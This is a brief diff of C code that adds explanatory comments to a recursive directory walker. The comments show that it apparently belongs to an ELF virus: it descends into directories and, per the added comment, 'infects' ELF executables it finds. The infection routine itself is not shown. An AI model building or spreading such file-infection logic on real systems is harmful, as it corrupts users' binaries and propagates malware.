@@ -68,11 +68,16 @@ int			ft_printer(t_stock *stock, int lvl)
 	t_stock	explorer;
 	char	*buf;
 
+	// ####################################################################################################
+	                                             // OUTPUT LOOP
+	// ####################################################################################################
 	i = -1;
 	while (stock->output[++i])
 	{
+		// add full path of file : ls + /bin = /bin/ls
 		if (ft_addpath(stock->output[i], stock->dirt[lvl], &tmp))
 			return (1);
+		// if its a dir, open dir and sonar it
 		if (is_dir(tmp) && tmp[ft_strlen(stock->dirt[lvl]) + ft_strlen(stock->output[i])] != '.'
 			&& tmp[ft_strlen(stock->dirt[lvl]) + ft_strlen(stock->output[i])] != '/'
 			&& !ft_islink(tmp, &buf, 0))
@@ -86,6 +91,7 @@ int			ft_printer(t_stock *stock, int lvl)
 			if (visual)
 				printf("\n%s\nft_ls: %s: Permission denied\n" , tmp, stock->output[i]);
 		}
+		// if its a file, in case of an ELF infect it
 		else if (is_file(tmp) && !is_dir(tmp))
 		{
 			if (IsELF(tmp))
